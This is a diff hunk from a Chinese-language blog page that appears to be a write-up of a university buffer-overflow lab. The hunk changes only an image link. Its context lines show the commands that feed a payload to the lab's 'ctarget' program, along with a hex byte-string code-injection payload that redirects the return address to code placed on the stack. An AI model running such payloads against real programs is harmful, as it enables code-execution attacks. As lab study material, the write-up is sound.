@@ -193,7 +193,7 @@
 <p><code>./hex2raw &lt; hex2 &gt;answer2</code></p>
 <p>再执行 ： <code>./ctarget &lt; answer2 -q</code></p>
 <p>此时栈的结构如下图所示：</p>
-<p><img src="/pic/image-20230913151421140.png" alt="image-20230913151421140"></p>
+<p><img src="/pic/image-20231016131333567.png" alt="image-20230913151421140"></p>
 <p>不过此种方法必非唯一方法，可以将返回地址定位在rsp+0x8h等地方，然后将攻击代码放在返回地址相应的位置上。例如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">bf fa 97 b9 59 68 ec 17</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">80 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>
 
